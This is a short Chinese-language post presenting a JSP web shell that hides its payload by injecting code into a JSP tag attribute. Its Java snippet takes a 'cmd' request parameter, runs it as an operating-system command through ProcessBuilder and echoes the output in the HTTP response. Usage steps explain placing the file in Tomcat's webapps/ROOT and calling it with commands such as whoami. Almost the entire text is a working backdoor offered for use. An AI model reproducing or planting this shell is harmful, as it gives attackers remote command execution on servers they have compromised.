### 利用jsp标签属性注入解析后代码的JSP WebShell

注入到jsp标签属性的代码preview
```java
new java.util.function.Supplier<String>() {
  public String get() {
    try {
      String s = request.getParameter(\"cmd\");
      Process process = new ProcessBuilder().command(s.split(\" \")).start();
      java.io.InputStream inputStream = process.getInputStream();
      StringBuilder stringBuilder = new StringBuilder();
      java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
      String line;
      while ((line = bufferedReader.readLine()) != null) { 
        stringBuilder.append(line).append(\"\n\");
      }
      response.getOutputStream().write(stringBuilder.toString().getBytes());
    } catch (Exception e) { 
      e.printStackTrace();
    }
    return \"\";
  }
}.get()
```

使用：
```
1.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

2.在浏览器访问22.jsp，并使用参数cmd传入需要远程执行的命令，例：http://127.0.0.1:8080/22.jsp?cmd=whoami

3.服务器将会执行相应的shell命令，最后回显
```